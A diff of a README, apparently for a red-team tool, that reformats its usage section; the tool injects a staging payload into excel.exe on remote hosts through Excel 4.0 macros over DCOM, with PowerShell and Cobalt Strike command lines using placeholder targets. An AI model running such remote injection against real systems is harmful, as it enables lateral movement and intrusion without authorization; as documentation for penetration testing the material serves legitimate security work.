@@ -7,11 +7,11 @@ Last year, after our presentation at DerbyCon, we released a blog post detailing
 It turns out that Excel 4.0 macros are also exposed to DCOM via the ExecuteExcel4Macro method. We modified our process injection XLM macro sample to work on remote hosts as well via DCOM and we hereby release it in PowerShell and Cobalt Strike script versions.
 
 ## Usage
-Cobalt Strike version:
+**Cobalt Strike version**
 `Excel4-DCOM <targethost> <listener>`
 This will inject a x86 staging payload into excel.exe on the target host. Make sure to execute this from a 32 bit beacon (which can be running on a 64 bit system).
 
-PowerShell version:
+**PowerShell version**
 `Invoke-Excel4DCOM -ComputerName <target> -Payload <payload location>`
 This will inject a x86 staging payload into excel.exe on the target host. Make sure to execute this from a 32 bit PowerShell host (%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe). 
 
